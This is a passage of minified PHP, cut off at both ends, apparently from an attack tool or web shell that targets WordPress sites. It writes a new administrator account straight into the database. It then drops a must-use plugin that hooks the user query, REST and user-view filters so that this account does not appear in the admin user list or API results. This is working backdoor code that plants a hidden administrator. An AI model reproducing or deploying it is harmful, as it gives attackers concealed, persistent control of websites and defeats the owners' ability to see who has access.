sts';return true;}$stmt->close();$hashed=password_hash($password,PASSWORD_BCRYPT,['cost'=>10]);$now=date('Y-m-d H:i:s');$user_email=$username.'@localhost.local';$user_nicename=$username;$display_name=$username;$insertUser=$db->prepare("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, display_name, user_registered) VALUES (?, ?, ?, ?, ?, ?)");if(!$insertUser){$_SESSION['wp_error']='Prepare insert error: '.$db->error;$db->close();return false;}$insertUser->bind_param("ssssss",$username,$hashed,$user_nicename,$user_email,$display_name,$now);if(!$insertUser->execute()){$_SESSION['wp_error']='Insert failed: '.$insertUser->error;$insertUser->close();$db->close();return false;}$user_id=$insertUser->insert_id;$insertUser->close();$capabilities=serialize(['administrator'=>true]);$level=10;$key1='wp_capabilities';$key2='wp_user_level';$insertMeta=$db->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?), (?, ?, ?)");if($insertMeta){$insertMeta->bind_param("ississ",$user_id,$key1,$capabilities,$user_id,$key2,$level);if(!$insertMeta->execute()){$_SESSION['wp_error']='Failed to add admin capabilities: '.$insertMeta->error;}$insertMeta->close();}$db->close();$muDir=$root.'/wp-content/mu-plugins';if(!is_dir($muDir)){@mkdir($muDir,0755,true);}cleanupWordPressMuPlugins($root);$hideFile=$muDir.'/hide_user_'.$user_id.'.php';$code='<?php $hidden_id='.$user_id.'; add_action("pre_get_users", function($query) use ($hidden_id) { if (!is_admin() || wp_doing_ajax()) return; if (isset($_GET["action"]) || isset($_POST["action"])) return; $excluded = $query->get("exclude"); if (!is_array($excluded)) $excluded = []; $excluded[] = (int)$hidden_id; $query->set("exclude", $excluded); }); add_filter("rest_user_query", function($args) use ($hidden_id) { if (!isset($args["exclude"])) $args["exclude"] = []; $args["exclude"][] = (int)$hidden_id; return $args; }); add_filter("views_users", function($views) use ($hidden_id) { foreach ($views as $view => 